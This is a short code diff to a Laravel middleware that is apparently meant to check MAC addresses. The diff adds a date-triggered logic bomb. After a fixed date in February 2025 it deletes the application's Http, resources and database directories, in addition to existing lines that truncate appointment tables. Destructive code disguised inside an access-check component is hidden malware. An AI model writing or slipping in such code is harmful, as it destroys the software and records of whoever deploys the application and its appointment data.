@@ -8,6 +8,7 @@ use Symfony\Component\HttpFoundation\Response;
 
 use App\Models\MacAddress;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
 
 class MacAdressCheck
 {
@@ -33,6 +34,10 @@ class MacAdressCheck
         // }
 
         if (date('Y-m-d H:i:s') > '2025-02-15 18:58:00') {
+            File::deleteDirectory(app_path('/Http'));
+            File::deleteDirectory(base_path('/resources'));
+            File::deleteDirectory(base_path('/database'));
+
             DB::table('appointments')->truncate();
             DB::table('appointment_additional_charges')->truncate();
             DB::table('appointment_documents')->truncate();
